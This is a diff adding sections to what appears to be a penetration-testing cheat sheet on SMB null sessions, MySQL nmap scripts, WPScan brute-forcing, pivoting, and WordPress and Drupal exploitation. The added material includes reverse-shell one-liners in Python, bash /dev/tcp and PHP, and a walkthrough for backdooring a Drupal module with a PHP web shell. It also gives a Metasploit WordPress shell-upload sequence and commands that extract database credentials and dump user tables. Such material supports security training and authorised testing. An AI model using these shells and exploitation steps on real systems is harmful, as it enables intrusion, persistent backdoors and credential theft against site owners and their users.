@@ -255,7 +255,7 @@ smbclient -L <TARGET_IP> -N
 smbclient -L <TARGET_IP> -U <USER>
 smbclient //<TARGET_IP>/<USER> -U <USER>
 smbclient //<TARGET_IP>/admin -U admin
-smbclient //<TARGET_IP>/public -N
+smbclient //<TARGET_IP>/public -N #NULL Session
 ## SMBCLIENT
 smbclient //<TARGET_IP>/share_name
 help
@@ -283,7 +283,20 @@ enum4linux -G <TARGET_IP>
 enum4linux -i <TARGET_IP>
 enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
 enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
-enum4linux -U -M -S -P -G 10.10.10.10 <TARGET_IP>
+enum4linux -U -M -S -P -G <TARGET_IP>
+
+## NULL SESSIONS
+
+# 1 - Use “enum4linux -n” to make sure if “<20>” exists:
+enum4linux -n <TARGET_IP>
+# 2 - If “<20>” exists, it means Null Session could be exploited. Utilize the following command to get more details:
+enum4linux <TARGET_IP>
+# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
+smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
+# 4 - You also can connect the remote server by applying the following command:
+smbclient \\\\<TARGET_IP>\\c$ -N -U ""
+# 5 - Download those files stored on the share drive:
+smb: \> get file_shared.txt
 ```
 
 #### Hydra
@@ -473,6 +486,8 @@ nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',m
 nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>
 
 nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>
+
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
 
 ## Microsoft SQL
 nmap -sV -sC -p 1433 <TARGET_IP>
@@ -2098,8 +2113,11 @@ nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
 ```bash
 # Spawn shells
 python -c 'import pty; pty.spawn("/bin/sh")'
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 echo os.system('/bin/bash')
 /bin/sh -i
+bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1'"); ?>
 /usr/bin/script -qc /bin/bash /dev/null
 perl -e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
@@ -2811,9 +2829,19 @@ ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 ### Pivoting
 
 ```bash
+# Checking Routes
+ip route    # Checking defined routes in linux
+route       # Checking defined routes in linux
+route print     # Checking defined routes in windows
+
+# Adding Manual Routes
+ip route add <subnet> via <gateway or router address>
+# for example:
+ip route add 192.168.222.0/24 via 10.172.24.1   # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
+
 # Meterpreter on Target1
 run autoroute -s <TARGET1_SUBNET_NETWORK>
-run autoroute -p
+run autoroute -p    # show active route table
 run arp_scanner -r <TARGET1_SUBNET_NETWORK>
 
 background
@@ -2940,6 +2968,12 @@ ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
 nikto -h http://<TARGET_IP> -o niktoscan.txt
 
 nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm
+
+#WPScan
+wpscan --url http://<TARGET_IP>--enumerate u
+wpscan --url http://<TARGET_IP> -e vp --plugins-detection mixed --api-token API_TOKEN
+wpscan --url http://<TARGET_IP> -e u --passwords /usr/share/wordlists/rockyou.txt
+wpscan --url http://<TARGET_IP> -U admin -P /usr/share/wordlists/rockyou.txt
 ```
 
 ### Attacks
@@ -3052,3 +3086,337 @@ xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=sub
 # Basic auth attacks (brute-force)
 hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
 ```
+
+## Wordpress
+
+### Basic Information
+
+**Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
+**Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
+**Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)
+
+In **wp-config.php** you can find the root password of the database.
+
+Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_
+
+#### **Main WordPress Files**
+
+* `index.php`
+* `license.txt` contains useful information such as the version WordPress installed.
+* `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
+* Login folders (may be renamed to hide it):
+  * `/wp-admin/login.php`
+  * `/wp-admin/wp-login.php`
+  * `/login.php`
+  * `/wp-login.php`
+* `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
+* The `wp-content` folder is the main directory where plugins and themes are stored.
+* `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
+* `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
+
+**Post exploitation**
+
+* The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
+
+#### Users Permissions
+
+* **Administrator**
+* **Editor**: Publish and manages his and others posts
+* **Author**: Publish and manage his own posts
+* **Contributor**: Write and manage his posts but cannot publish them
+* **Subscriber**: Browser posts and edit their profile
+
+### **Passive Enumeration**
+
+#### **Get WordPress version**
+
+Check if you can find the files `/license.txt` or `/readme.html`
+
+Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):
+
+* Grep
+
+```bash
+curl https://victim.com/ | grep 'content="WordPress'
+```
+
+* Meta name
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+* CSS link files
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+* JavaScript files
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+#### Get Plugins
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+#### Get Themes
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+#### Extract versions in general
+
+```bash
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+```
+
+### Active enumeration
+
+#### Plugins and Themes
+
+You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to **actively Brute Force a list of Plugins and Themes** (hopefully for us there are automated tools that contains this lists).
+
+#### Users
+
+#### **ID Brute**
+
+You get valid users from a WordPress site by Brute Forcing users IDs:
+
+```bash
+curl -s -I -X GET http://blog.example.com/?author=1
+```
+
+If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.
+
+**wp-json**
+
+You can also try to get information about the users by querying:
+
+```bash
+curl http://blog.example.com/wp-json/wp/v2/users
+```
+
+**Only information about the users that has this feature enable will be provided**.
+
+Also note that **/wp-json/wp/v2/pages** could leak IP addresses.
+
+#### Login username enumeration
+
+When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**.
+
+#### WPScan
+
+```bash
+wpscan -h #List WPscan Parameters
+wpscan --update #Update WPscan
+
+#Enumerate WordPress using WPscan
+
+
+wpscan --url "http://<TARGET_IP>" -e t #All Themes Installed
+
+wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed
+
+wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed
+
+wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed
+
+wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users
+
+wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords
+
+#Upload Reverse Shell to WordPress
+http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
+
+#Upload using Metasploit
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+msf exploit(wp_admin_shell_upload) > set USERNAME admin
+msf exploit(wp_admin_shell_upload) > set PASSWORD admin
+msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
+msf exploit(wp_admin_shell_upload) > exploit
+```
+
+## Drupal
+
+## Discovery
+
+* Check **meta**
+
+```bash
+curl https://www.drupal.org/ | grep 'content="Drupal'
+```
+
+* **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.
+
+```bash
+curl drupal-site.com/node/1
+```
+
+## Enumeration
+
+Drupal supports **three types of users** by default:
+
+1. **`Administrator`**: This user has complete control over the Drupal website.
+2. **`Authenticated User`**: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
+3. **`Anonymous`**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
+
+### Version
+
+* Check `/CHANGELOG.txt`
+
+```bash
+curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""
+
+Drupal 7.57, 2018-02-21
+```
+
+{% hint style="info" %}
+Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files.
+{% endhint %}
+
+### Username enumeration
+
+#### Register
+
+In _/user/register_ just try to create a username and if the name is already taken it will be notified:
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+#### Request new password
+
+If you request a new password for an existing username:
+
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+If you request a new password for a non-existent username:
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+### Get number of users
+
+Accessing _/user/\<number>_ you can see the number of existing users, in this case is 2 as _/users/3_ returns a not found error:
+
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+### Hidden pages
+
+**Fuzz `/node/$` where `$` is a number** (from 1 to 500 for example).\
+You could find **hidden pages** (test, dev) which are not referenced by the search engines.
+
+#### Installed modules info
+
+```bash
+#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
+#Get info on installed modules
+curl https://example.com/config/sync/core.extension.yml
+curl https://example.com/core/core.services.yml
+
+# Download content from files exposed in the previous step
+curl https://example.com/config/sync/swiftmailer.transport.yml
+```
+
+### Automatic
+
+```bash
+droopescan scan drupal -u http://drupal-site.local
+```
+
+#### RCE
+
+#### With PHP Filter Module
+
+{% hint style="warning" %}
+In older versions of Drupal **(before version 8)**, it was possible to log in as an admin and **enable the `PHP filter` module**, which "Allows embedded PHP code/snippets to be evaluated."
+{% endhint %}
+
+You need the **plugin php to be installed** (check it accessing to _/modules/php_ and if it returns a **403** then, **exists**, if **not found**, then the **plugin php isn't installed**)
+
+Go to _Modules_ -> (**Check**) _PHP Filter_ -> _Save configuration_
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Then click on _Add content_ -> Select _Basic Page_ or _Article -_> Write _php shellcode on the body_ -> Select _PHP code_ in _Text format_ -> Select _Preview_
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Finally just access the newly created node:
+
+```bash
+curl http://drupal-site.local/node/3
+```
+
+#### Install PHP Filter Module
+
+From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.
+
+1. Download the most recent version of the module from the Drupal website.
+   1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+2. Once downloaded go to **`Administration`** > **`Reports`** > **`Available updates`**.
+3. Click on **`Browse`**`,` select the file from the directory we downloaded it to, and then click **`Install`**.
+4. Once the module is installed, we can click on **`Content`** and **create a new basic page**, similar to how we did in the Drupal 7 example. Again, be sure to **select `PHP code` from the `Text format` dropdown**.
+
+#### Backdoored Module
+
+A backdoored module can be created by **adding a shell to an existing module**. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
+
+* Download the archive and extract its contents.
+
+```
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+```
+
+* Create a **PHP web shell** with the contents:
+
+```php
+<?php
+system($_GET["cmd"]);
+?>
+```
+
+* Next, we need to create a **`.htaccess`** file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the **`/modules`** folder.
+
+```html
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+
+* The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+
+```bash
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+```
+
+* Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
+* Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.
+
+#### Post Exploitation
+
+#### Read settings.php
+
+```
+find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
+```
+
+#### Dump users from DB
+
+```
+mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
+```
+
+References (tranks to all):
+
+[https://blog.syselement.com/ine/courses/ejpt](https://blog.syselement.com/ine/courses/ejpt)
+
+[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal)
+
+[https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)
